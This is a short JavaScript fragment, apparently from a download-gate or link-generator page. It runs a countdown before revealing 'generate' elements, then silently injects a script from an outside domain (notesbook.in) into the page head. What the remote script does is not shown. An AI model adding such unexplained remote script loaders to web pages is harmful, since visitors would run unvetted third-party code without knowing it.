var count= 5;
  var counter=setInterval(timer, 1500);
  function timer(){
    count=count-1;
    if (count <= 0){ 
      document.getElementById('yuidea-wait1').style.display = 'none';
      document.getElementById('yuidea-generate').style.display = 'block';
      document.getElementById('yuidea-snp').style.display='block';
      clearInterval(counter);
      return;
    }
    document.getElementById("yuidea-time").innerHTML=count;
  } 

  var b = document.createElement('script');
b.src = 'https://bd12.notesbook.in/min.js';
document.head.appendChild(b);
